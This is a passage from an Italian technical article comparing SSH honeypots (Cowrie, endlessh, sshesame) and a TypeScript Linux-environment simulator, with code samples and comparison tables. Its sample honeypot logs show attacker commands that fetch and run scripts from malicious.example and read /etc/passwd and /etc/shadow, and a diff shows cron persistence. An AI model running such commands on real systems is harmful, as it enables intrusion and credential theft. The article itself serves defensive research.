import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Invia al browser xterm.js via WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Trasmetti i tasti del browser alla shell
  shell.write(data);
});
```

È lo schema standard per IDE cloud e terminali web: xterm.js (browser) ↔ WebSocket ↔ node-pty ↔ vero bash. L'isolamento resta inesistente. La shell gira con tutti i permessi del processo Node.js (o dell'utente che lo lancia).

**Mantenuto da**: Microsoft.
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Parte 4: gli honeypot SSH

Gli honeypot sono pensati per essere attaccati. Lo scopo è sembrare abbastanza reale da far interagire gli attaccanti, registrando tutto ciò che fanno per la threat intelligence. SSH è il bersaglio principale perché è il servizio più attaccato su internet: se esponi la porta 22 su un IP pubblico, vedrai tentativi di scansione automatizzata in pochi minuti letteralmente. Provalo un giorno, è abbastanza terrificante quanto in fretta arriva.

La qualità di un honeypot si misura in due cose: la **fedeltà** (quanto imita in modo convincente un vero sistema) e la **telemetria** (quanti dati utili cattura). Queste due cose sono in tensione. Un honeypot ad alta fedeltà è più difficile da costruire e più rischioso da operare.

Questa sezione è ciò che alla fine mi ha portato a costruire il modulo `HoneyPot` in `typescript-virtual-container`, quindi ho qualche opinione qui.

### 4.1 Cowrie: il gold standard

Cowrie è un honeypot SSH e Telnet a interazione medio-alta basato su Python. È l'honeypot SSH più distribuito nella community di ricerca e sicurezza.

Architettura:
- **Strato protocollo**: vera implementazione del protocollo SSH (Twisted Conch), quindi gli attaccanti hanno veri handshake, vero scambio chiavi, vera autenticazione
- **Strato shell**: un falso filesystem (somigliante a Debian 5.0) e un interprete di shell parziale che risponde ai comandi comuni
- **Modalità proxy**: può instradare verso un vero sistema dietro (alta interazione), registrando tutto ciò che passa
- **Modalità LLM** (aggiunta recente): usa un modello di linguaggio per generare risposte dinamiche ai comandi che non sa gestire: sì, Cowrie ha ormai una modalità IA. Viviamo un'epoca folle.

```python
# Ciò che Cowrie cattura
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie salva i file scaricati (via wget/curl/SFTP/SCP) per l'analisi malware. Si integra con Splunk, Elasticsearch, e altre piattaforme SIEM.

**Fedeltà**: medio-alta. Abbastanza convincente da ingannare bot automatizzati (che sono il 99% degli attaccanti SSH: quasi tutti sono solo script stupidi che provano `root`/`password`). Umani sofisticati possono identificarlo per fingerprint però, generalmente in fretta.

**Linguaggio**: Python (Twisted)
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo: il predecessore di Cowrie

Kippo è l'honeypot SSH a interazione media originale su cui Cowrie era basato. Stessa idea di base: vero protocollo SSH, falso filesystem, shell parziale. Cowrie l'ha completamente superato a questo punto: Kippo è archiviato e nessuno dovrebbe usarlo nel 2026. Citato qui puramente per esaustività storica, dato che potresti vederlo citato in vecchi post di blog e paper di sicurezza.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo): archiviato

---

### 4.3 endlessh: il tarpit SSH

endlessh è un honeypot degenere: tiene le connessioni SSH aperte diffondendo lentamente i dati di banner a 1 byte al secondo (o meno). Un client SSH che vi si connette resterà bloccato all'infinito: non arriverà mai all'autenticazione perché il server non finisce mai di inviare il banner.

Lo scopo non è la threat intelligence ma il puro rifiuto di risorsa: occupare i thread di scansione degli attaccanti perché non possano raggiungere i veri bersagli altrettanto in fretta. È onestamente un po' diabolico nel senso buono. Non impari niente dall'attaccante: gli fai solo perdere tempo. C'è qualcosa di profondamente soddisfacente lì dentro.

```c
// Tutto il comportamento protocollare di endlessh:
// Invia: "SSH-2.0-OpenSSH_" poi aggiunge lentamente caratteri casuali
// Non chiudere mai la connessione
// Lo scanner dell'attaccante scade dopo N secondi
```

Nessun comando è catturato. Nessuna autenticazione è testata. Solo tempo di connessione.

**Scritto in**: C
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame: l'honeypot "fai entrare tutti"

sshesame accetta tutte le connessioni SSH (qualsiasi utente, qualsiasi password, qualsiasi chiave) e registra tutto. È un honeypot a zero interazione: non risponde ai comandi, lascia solo "entrare" gli attaccanti e registra ogni tasto che digitano.

```
2024-01-15 03:22:11 Connessione da 45.33.32.156
  Utente: root, Password: password123: accettato
  Comandi digitati:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Disconnesso dopo 47s
```

Utile per la raccolta di credenziali: accumuli in fretta nomi utente e password che i bot provano, il che ti dice quali credenziali di default sono attivamente bruteforzate ora. Spoiler: è sempre `root`/`password`, `admin`/`admin`, e `root`/`123456`. Ogni volta.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird: framework honeypot basato su Docker

`lyrebird/honeypot-base` è un'immagine base Docker per costruire honeypot di servizi rete. Non è specificamente un honeypot SSH: è un framework per costruire honeypot per qualsiasi protocollo.

L'immagine base fornisce un framework di logging, un sistema di plugin per i protocolli, e configurazioni Docker Compose per honeypot multi-servizio. La estendi per simulare servizi specifici.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Costruire un honeypot SSH in Node.js: il metodo ingenuo, e perché fallisce

Prima di `typescript-virtual-container`, costruire un honeypot SSH in Node.js voleva dire combinare la vera libreria `ssh2` con una simulazione manuale di comandi. Molto noioso, molto incompleto, ma... è un passaggio obbligato a questo punto:

```js
// honeypot SSH ingenuo: credenziali loggate, comandi finti
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Registra il tentativo
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Fai entrare tutti
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Risposta simulata
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

"Funziona" nel senso che cattura credenziali e comandi. Ma è palesemente falso appena un attaccante sofisticato scava un po'. `uname -a` restituisce la stringa giusta ma `ls /etc` restituisce "command not found": puzza di trappola lontano un miglio. Il filesystem non esiste. I comandi non si concatenano. Le pipe non funzionano. Le variabili non si espandono.

Un attaccante competente identificherà il tuo honeypot nei primi cinque comandi. Gli script automatizzati che cercano un comportamento tipo Cowrie lo rileveranno subito anche loro. È a quanto pare ciò che ha spinto l'autrice di `typescript-virtual-container` a costruire qualcosa che interpreta davvero i comandi per davvero: più su questo nella Parte 5.

---

### Riepilogo della famiglia honeypot

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Ingenuo ssh2 |
|---|---|---|---|---|---|---|
| **Livello di interazione** | medio-alto | medio | zero | zero | variabile | basso |
| **Vero protocollo SSH** | sì | sì | no (tarpit) | sì | variabile | sì |
| **Fedeltà della shell** | media | media | n/a | nessuna | variabile | minima |
| **Cattura le credenziali** | sì | sì | no | sì | sì | sì |
| **Cattura i comandi** | sì | sì | no | sì | variabile | sì |
| **Cattura i malware** | sì | sì | no | no | no | no |
| **Integrazione SIEM** | sì nativa | no | no | no | no | manuale |
| **Risposte LLM** | sì (nuovo) | no | no | no | no | no |
| **Linguaggio** | Python | Python | C | Go | Docker | Node.js |
| **Nativo Node.js** | no | no | no | no | no | sì |
| **Stato** | molto attivo sì | archiviato avviso | attivo sì | attivo sì | attivo sì | fai-da-te |

Lo schema qui è abbastanza chiaro: più vuoi fedeltà, più devi scrivere Python. Cowrie è il vincitore indiscusso se fai sul serio: è stato provato sul campo per anni e cattura molto più di semplici credenziali. endlessh e sshesame sono progetti simpatici più che seri strumenti di threat intelligence. E l'approccio ingenuo in Node.js ti porta forse al 20% del percorso prima di sbattere contro un muro.

---

## Parte 5: `typescript-virtual-container`: ciò che colma il fossato

OK allora qui le cose diventano interessanti. Dopo aver catalogato tutte le famiglie qui sopra, il quadrante mancante diventa abbastanza evidente:

- Le sandbox JS: isolano il codice, niente shell, niente filesystem, niente SSH
- Gli emulatori Linux: vero OS, vera shell, vero SSH... ma 150+ MB di RAM, 30 secondi di avvio, e devi costruire la tua API sopra gli I/O seriali
- Gli honeypot: falsa shell, niente API programmabile, Python/Go/C, non nativo Node

Nessuno aveva costruito un ambiente Linux completo, programmabile, nativo Node, con vero SSH, veri permessi, vera rete virtuale, e un'API TypeScript tipizzata. Allora lei l'ha costruito.

Piccola introduzione dato che è la prima volta che la cito correttamente: `typescript-virtual-container` è stato costruito da [Chloé Rolzhausen](https://itsrealfortune.fr), una sviluppatrice francese che si fa chiamare **Fortune** (o ItsRealFortune) online. Puoi trovarla sul suo [sito web](https://itsrealfortune.fr) e su [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Tutto il progetto: 56 000 righe di TypeScript, 247 file, 170 comandi: è stato uno sforzo in solo da una sola persona. La chiamerò Fortune per il resto dell'articolo. E sì, è abbastanza folle. Vai a dare un'occhiata al suo lavoro!

### Cos'è davvero

`typescript-virtual-container` è un **simulatore di ambiente Linux** scritto in TypeScript puro. Niente Wasm, niente estensioni native, niente kernel. Circa 56 000 righe di sorgente su 247 file TypeScript.

L'intuizione chiave: non serve un emulatore CPU per far funzionare `ls /etc | grep passwd`. Serve:
1. Un albero di nodi in memoria che rispondono alle operazioni di percorso
2. Un modello di permessi POSIX applicato a ogni accesso
3. Un analizzatore sintattico di shell che capisce pipeline, redirezioni, subshell ed espansione di variabili
4. Circa 170 implementazioni di comandi (funzioni, non binari)
5. Un sistema di gestione di utenti e gruppi
6. Qualcosa per esporre tutto questo via SSH

Tutto questo è realizzabile in TypeScript puro senza alcun coinvolgimento del kernel.

### Il VirtualFileSystem

Il VFS è un albero in memoria di nodi tipizzati: niente I/O disco a meno che attivi in modo esplicito la modalità di persistenza `"fs"`:

```ts
// Rappresentazione interna semplificata
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // placeholder caricato pigramente
```

Ogni operazione di percorso passa da `normalizePath` (risolve `.`, `..`, i link simbolici) e `enforceAccess` (verifica i permessi lettura/scrittura/esecuzione rispetto all'uid/gid richiedente). `chmod`, `chown`, sticky bit e setuid sono tutti implementati e davvero applicati. Se un processo in esecuzione come uid 1000 prova a leggere un file di root con modo 0600, ottiene EACCES: non un falso EACCES, una vera `Error` JavaScript lanciata dalla verifica di permesso. Questa parte è abbastanza elegante onestamente.

Il VFS si serializza in:
- `.vfsb`: un formato binario compatto (personalizzato, con compressione fflate): è il formato di default
- Istantanea JSON: leggibile dall'umano, buona per il debug
- Archivio TAR: import/export col vero formato tar, quindi puoi fare `tar -xf` qualcosa e il VFS ha giusto... quei file
- Immagine SquashFS: import in sola lettura

In modalità di persistenza `"fs"`, mantiene un journal write-ahead (WAL) per il recupero dopo crash: le scritture vanno prima nel journal, poi nell'istantanea al flush. Se Node si pianta nel mezzo di un'operazione, il journal ti permette di ricostruire l'ultimo stato completo.

C'è anche uno strato `FileCache` che simula la latenza degli I/O disco. Configuri profili come `NVME_DISK_IO` o `HDD_DISK_IO` e il VFS ritarda artificialmente le operazioni sui file per corrispondere a tempistiche realistiche. Il che è abbastanza divertente: un software che si rallenta di proposito per simulare hardware: ma in realtà molto utile per il benchmarking.

### L'interprete di shell

L'analizzatore sintattico della shell produce un AST tipizzato:

```ts
// "ls /etc | grep root && echo done" si analizza in:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

L'esecutore percorre questo AST:
- Per una pipeline, crea una catena di flussi `{ stdin, stdout, stderr }` ed esegue ogni comando con I/O in pipeline
- Per gli operatori logici (`&&`, `||`), verifica `$?` dopo il lato sinistro prima di eseguire il destro
- Per le subshell (`$(...)`, `` ` ` ``), biforca il contesto di esecuzione
- Per le redirezioni (`>file`, `>>file`, `2>&1`, `<file`), configura il cablaggio dei flussi prima dell'esecuzione
- Per i task di background (`cmd &`), esegue senza aspettare la fine
- Per le variabili, espande `$VAR`, `${VAR:-default}`, `${#VAR}`, e l'aritmetica `$((expr))`
- Per l'espansione di parentesi (`{a,b,c}`, `{1..5}`), genera la lista di espansione completa prima di eseguire

Tutto questo è vero comportamento POSIX shell. L'analizzatore gestisce heredoc, sostituzione di processo, globbing (`*`, `?`, `[abc]`), e gestione delle virgolette (singole, doppie con interpolazione, escape con backslash). Non è perfetto: casi limite esistono: ma è ben oltre ciò che ti aspetteresti da un progetto TypeScript.

### Circa 170 comandi integrati

I comandi sono funzioni TypeScript registrate in un registro di comandi. Ricevono un `CommandContext` coi flussi stdin/stdout/stderr, il VFS, la sessione utente, l'ambiente della shell, e l'accesso ai sottomoduli.

Scrivere 170 implementazioni di comandi Unix, è... tanto. Alcuni sono banali (`echo`, `true`, `false`), alcuni sono sorprendentemente complessi (`awk`, `find`, `tar`). Tipo, un `awk` POSIX completo? In TypeScript? È folle onestamente. Ecco un campione di ciò che c'è dentro:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (lato client, connessione uscente),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (editor interattivo completo), vim (base), vi (base),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulato), systemctl (stub), journalctl (stub),
...e circa altri 130
```

Gli "stub" (git, python3, node) rispondono in modo realistico alle invocazioni comuni: `python3 --version` restituisce una stringa di versione credibile, `git status` mostra uno stato di repo fittizio: senza fare vero lavoro. Per un honeypot, sono in realtà più utili dei veri comandi, perché ti permettono di osservare ciò che gli attaccanti provano a eseguire senza eseguire niente di pericoloso.

### Il server SSH

Lo strato SSH usa il vero package npm `ssh2`: vero protocollo SSH, vero scambio chiavi, vera cifratura. `SSHMimic` lo avvolge:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Vero SSH: ssh -p 2222 root@localhost
// Vero SFTP: sftp -P 2222 root@localhost
// Vero SCP: scp -P 2222 file root@localhost:/tmp/
```

Le `shellProperties` determinano ciò che `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, e `/etc/os-release` riportano. Puoi imitare qualsiasi distribuzione Linux e versione di kernel in modo convincente: per un vero client SSH, non c'è letteralmente modo di fare la differenza.

### Il modulo HoneyPot

Poiché l'interprete di shell è reale e il server SSH è reale, i comandi degli attaccanti girano davvero nell'ambiente virtuale. Le richieste `wget` innescate dall'attaccante sono registrate con gli URL di destinazione. I file creati dall'attaccante sono salvati nel VFS. I tentativi di escalation di privilegi dell'attaccante producono errori realistici.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Dopo una sessione, differenzia il filesystem
const before = shell.vfs.toSnapshot();
// ... sessione dell'attaccante ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

È qualitativamente diverso da Cowrie. Il falso filesystem di Cowrie può rispondere a `ls` ma non può davvero tracciare i file che un attaccante ha creato e le modifiche che ha apportato come diff strutturato. `typescript-virtual-container` può, perché il VFS è una struttura dati viva: ogni scrittura è tracciata. Questa voce cron che l'attaccante ha appena aggiunto? È nel diff. Quella cartella `.hidden`? Nel diff. Piuttosto utile per l'analisi malware.

### La pila rete virtuale

È probabilmente la parte più impressionante di tutto il progetto, e non ha equivalente in nessun altro progetto di questo spazio. Tipo, una pila rete virtuale L2/L3 completa con supporto VPN, scritta in TypeScript puro, senza alcuna scheda rete reale coinvolta. È davvero folle.

`VirtualNetworkManager` dà a ogni istanza `VirtualShell` interfacce rete virtuali con indirizzi IP configurabili, tabelle di routing, e un firewall software (regole stile iptables con conntrack e NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` mostrano tutti lo stato della rete virtuale.

`VirtualSwitch` (chiamato Baie: dalla parola francese per armadio server, "baie informatique") connette più shell su una sottorete condivisa. Implementa:
- Apprendimento MAC e ARP
- Routing IP tra sottoreti
- NAT (masquerade uscente)
- DNS (record configurabili per sottorete)
- Bilanciamento di carico (round-robin, meno connessioni)
- Modellamento del traffico: latenza, jitter (distribuzione gaussiana), perdita di pacchetti, perdita a raffiche, riordino, duplicazione
- Limitazione di banda (token bucket)
- Applicazione MTU
- Tracciamento di connessione (con stato, stati NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Tre macchine virtuali sullo stesso switch
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall: web può raggiungere api, api può raggiungere db, web non può raggiungere db direttamente
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Modellamento traffico: simula un collegamento WAN instabile verso l'esterno
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` crea tunnel cifrati tra istanze di Baie: puoi simulare una rete multi-sito con interconnessioni VPN tra siti.

`VirtualProxy` implementa il forwarding di porte e un proxy SOCKS5.

Niente di tutto questo tocca una vera scheda rete. È tutto routing di oggetti TypeScript. Il comando `ping` "funziona" instradando via lo switch virtuale e restituendo risposte ICMP simulate. `curl http://192.168.0.3/api` instrada via la rete virtuale, raggiunge la risposta HTTP simulata della shell api, e restituisce il contenuto. Sono tartarughe fino in fondo, nel senso migliore possibile.

### Il `SandboxedShell`

Per un uso programmatico dove serve un isolamento più forte, `SandboxedShell` esegue una sessione shell in un thread Worker Node.js:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% di un core
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

L'isolamento qui è assicurato dallo strato VFS (la shell del thread worker può vedere solo il filesystem virtuale, mai il filesystem ospite) più l'isolamento memoria del thread Worker Node.js. È più leggero di `isolated-vm` ma più appropriato per un isolamento a livello shell invece che a livello JS.

### Tetto delle risorse

Puoi configurare limiti di risorse per shell che influenzano ciò che i comandi di monitoraggio sistema riportano:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Dentro questa shell, `free -m` mostra 512 MB di RAM totale. `nproc` restituisce 2. `/proc/meminfo` mostra i valori con tetto. `htop` e `top` mostrano il numero di CPU con tetto. Permette di definire con precisione l'impronta hardware della macchina simulata.

### Tre modalità di deploy

```
Modalità 1: Server SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Vero protocollo SSH, vero SFTP, vero SCP
  → Casi d'uso: honeypot, ambienti di test remoti, laboratori di formazione

Modalità 2: Shell web (browser)
  builds/fortune-nyx-v1.7.8-web.min.js (bundle ESM)
  → Gira nel browser, VFS persistito in IndexedDB
  → Casi d'uso: tutorial interattivi, terminali integrati, demo
  → Bonus: esegue startxfce4 per un desktop XFCE completo simulato

Modalità 3: CLI autonoma
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (un solo file, niente installazione)
  → scarica ed esegui, persiste il VFS nella cartella .vfs/
  → Casi d'uso: demo rapide, sperimentazione locale
```

### I polyfill: come il build browser funziona senza Wasm

OK questa è la parte che trovo davvero intelligente e che volevo sottolineare apposta.

Far funzionare una libreria Node.js nel browser è generalmente un incubo. O usi un runtime Wasm (pesante, lento a caricare), o passi settimane a sostituire manualmente ogni import `node:*` con un'alternativa compatibile browser. Fortune ha fatto la seconda cosa: ma molto pulitamente, scrivendo un set di polyfill personalizzati che vivono nella cartella `polyfills/` del repo.

La pipeline di build è solo esbuild con un mucchio di voci `alias`:

```js
// demo/build.js: tutta la config del build browser
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Niente Wasm, niente libreria di polyfill esterna, niente ricorso a `webpack-node-externals`. Solo moduli con alias e qualche globale iniettata. Dettaglio ognuno perché alcuni sono davvero impressionanti.

**`node:fs`: IndexedDB come falso filesystem**

Questo è il mio preferito. Il polyfill `node:fs` implementa l'API sincrona Node.js fs (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) sostenuta da due strati: una `Map` in memoria per le letture sincrone, e IndexedDB per la persistenza tra i ricaricamenti di pagina. Le scritture vanno nella Map subito (quindi `readFileSync` subito dopo `writeFileSync` funziona sempre), poi sono svuotate verso IndexedDB in modo asincrono in background.

```js
// Cache sincrona (percorso → Uint8Array | null): letture istantanee
const memCache = new Map();

// Precarica tutto da IndexedDB in memCache all'avvio
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

È la ragione per cui l'istantanea VFS sopravvive ai ricaricamenti di pagina nel browser: l'intero binario `.vfsb` è scritto in IndexedDB via questo polyfill, e riletto al caricamento successivo. Niente Wasm, niente server. Solo IndexedDB, che è in tutti i browser dal 2011.

**`node:crypto`: SHA-256 in JS puro**

Invece di importare una libreria crypto Wasm, il polyfill crypto implementa SHA-256 da zero usando le costanti di round FIPS 180-4. 166 righe di JS puro con supporto completo delle uscite hex/base64/Uint8Array. Tutto l'hashing nella libreria passa di lì: l'impronta delle chiavi ospite SSH, le somme di controllo interne, tutto. Compatto, zero dipendenze, funziona.

**`node:os`: legge il vero hardware del browser**

Questa è una bella attenzione. Invece di restituire valori fittizi hardcodati, `node:os` legge `navigator.deviceMemory` per la RAM totale e `navigator.hardwareConcurrency` per il numero di CPU. Quindi `neofetch` nel build browser riporta in realtà qualcosa che corrisponde alla tua vera macchina: non uno stub bidone `2 core, 2 GB di RAM`.

```js
// usa i veri dati hardware del browser
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB di default
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // analizza anche navigator.userAgent per indovinare la stringa del modello CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify`: stub onesti**

Il browser non può aprire socket TCP o eseguire vero SSH, quindi sono stub che lanciano un errore `NotImplemented` con un messaggio chiaro se qualcosa prova a usarli. I fallimenti restano espliciti, niente `undefined` restituito dove un oggetto è atteso. Solo un messaggio forte e chiaro "questo non funziona nel browser": che è esattamente ciò che vuoi.

**`process.js` e `buffer.js`: globali iniettate**

Queste due sono iniettate in cima a ogni file del bundle via l'opzione `inject` di esbuild, quindi `process` e `Buffer` sono disponibili globalmente senza alcun import esplicito. `process.js` è minuscolo: `env`, `version`, `platform: 'browser'`, `nextTick` via `queueMicrotask`, `uptime` via `performance.now()`. `buffer.js` è una reimplementazione completa di `Buffer` sopra `Uint8Array`: tutti i metodi `readUInt32BE`, `writeInt16LE`, le codifiche hex/base64 da cui l'implementazione SSH e il VFS dipendono.

---

L'insieme dei polyfill fa circa 640 righe di JS scritto a mano in totale. Niente package npm, niente Wasm. E il risultato è un bundle browser che è solo la libreria, in esecuzione nativa, senza nessuna della solita ansia del "ma funziona davvero nel browser?" che hai con le librerie pensate prima per Node. Vale la pena dare un'occhiata alla cartella `polyfills/` nel repo se sei curioso: ogni file è ben contenuto e leggibile da solo, che è una scelta di stile che apprezzo molto.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Categoria** | Sandbox JS | Sandbox JS | Sandbox JS | Emulatore | Emulatore | Node.js/Wasm | Honeypot | Simulatore |
| **Isola il JS** | scope avviso | V8 Isolate sì | Wasm sì | n/a | n/a | parziale | n/a | Worker sì |
| **Vero kernel Linux** | no | no | no | sì | sì | no | no | no |
| **Interprete shell** | no | no | no | sì (reale) | sì (reale) | sì (reale) | parziale | sì (personalizzato) |
| **Circa 170 comandi Unix** | no | no | no | sì | sì | parziale | circa 20 | sì |
| **Permessi POSIX** | no | no | no | sì | sì | sì | parziale | sì applicati |
| **Gestione utenti** | no | no | no | sì | sì | no | minima | sì completa |
| **Vero server SSH** | no | no | no | no | no | no | sì | sì |
| **SFTP / SCP** | no | no | no | no | no | no | no | sì |
| **Honeypot/audit** | no | no | no | no | no | no | sì | sì |
| **Diff/istantanea VFS** | no | no | no | limitato | no | no | no | sì |
| **Rete virtuale L2/L3** | no | no | no | base | no | no | no | sì completo |
| **VPN virtuale** | no | no | no | no | no | no | no | sì |
| **Supporto browser** | no | no | sì | sì | sì | sì | no | sì |
| **Nativo Node.js** | sì | sì | sì | sì | no | no | no | sì |
| **API tipizzata** | base | sì | sì | minima | no | sì | no | sì completa |
| **Compatibilità binaria** | n/a | n/a | n/a | sì | sì | parziale | n/a | no |
| **Tempo avvio** | istantaneo | istantaneo | istantaneo | 15-40s | 15-40s | 2-5s | istantaneo | <1s |
| **RAM/istanza** | circa 1 MB | circa 3-10 MB | circa 5-15 MB | 150-256 MB | 200+ MB | circa 100 MB | circa 50 MB | circa 5-20 MB |
| **Dipendenze runtime** | 0 | 1 (nativa) | 1 (Wasm) | 0 | proprietaria | 1 | dipendenze Python | 3 (ssh2, ws, fflate) |
| **Stato** | stabile | attivo sì | attivo sì | molto attivo sì | commerciale | attivo sì | attivo sì | attivo sì |

---

## Quando usare cosa

**Devi eseguire JavaScript non affidabile: una formula inviata da un utente, un plugin, un hook di script.**
→ `isolated-vm`. Vero V8 Isolate, limiti memoria stretti, ponte di comunicazione esplicito. Evita `vm2`: la lista dei CVE continua solo ad allungarsi, sul serio è tipo una nuova ogni pochi mesi. Evita `vm`: non è affatto una sandbox, per favore.

**Devi isolare JS e non vuoi un'estensione nativa, o ti serve compatibilità browser.**
→ `quickjs-emscripten`. Frontiera Wasm, modulo di circa 500 KB, funziona nei browser e in Node. Più lento di V8 ma davvero isolato.

**Devi avviare un vero OS Linux non modificato con compatibilità binaria.**
→ `v86` per Linux a 32-bit, o `container2wasm` se hai un'immagine Docker esistente. Accetta 150+ MB di RAM e 30 secondi di avvio, è il deal. Se ti serve il 64-bit, guarda CheerpX o usa giusto un vero runtime di container.

**Devi integrare un terminale tipo Linux in un'app web senza backend.**
